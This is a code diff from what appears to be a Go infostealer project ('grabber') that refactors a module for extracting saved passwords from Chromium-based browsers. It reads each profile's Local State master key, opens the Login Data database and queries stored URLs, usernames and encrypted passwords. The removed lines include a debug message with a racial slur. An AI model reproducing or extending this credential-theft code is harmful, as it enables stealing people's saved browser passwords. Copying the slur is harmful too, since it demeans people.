@@ -3,11 +3,8 @@ package pass
 import (
 	"database/sql"
 	"encoding/json"
-	"fmt"
-	"os"
-	"strings"
 
-	"kdot/grabber/browsers/util"
+	"kdot/grabber/browsers/chromium/structs"
 	"kdot/grabber/decryption"
 )
 
@@ -17,35 +14,15 @@ type Passwords struct {
 	Password  string `json:"password"`
 }
 
-func Get() string {
-
+func Get(browsersList []structs.Browser) string {
 	var passwords []Passwords
-	dpPaths := util.GetBPth()
-	extraPaths := util.GetProfiles()
-	for _, path := range dpPaths {
-		// check if the path exists
-		if _, err := os.Stat(path); os.IsNotExist(err) {
-			continue
-		}
-		master_key := decryption.GetMasterKey(path + "\\Local State")
-		ranOpera := false
-		for _, profile := range extraPaths {
-			if ranOpera {
-				break
-			} else if strings.Contains(path, "Opera") {
-				profile = path
-				ranOpera = true
-				if _, err := os.Stat(path); os.IsNotExist(err) {
-					continue
-				}
-			} else {
-				if _, err := os.Stat(path + "\\" + profile); os.IsNotExist(err) {
-					continue
-				}
-				path = path + "\\" + profile
-			}
 
-			db, err := sql.Open("sqlite3", path+"\\Login Data")
+	for _, browser := range browsersList {
+		master_key := decryption.GetMasterKey(browser.LocalState)
+		for _, profile := range browser.Profiles {
+			path := profile.LoginData
+
+			db, err := sql.Open("sqlite3", path)
 			if err != nil {
 				continue
 			}
@@ -53,7 +30,6 @@ func Get() string {
 
 			row, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
 			if err != nil {
-				fmt.Println("this is the issue nigga")
 				continue
 			}
 			defer row.Close()
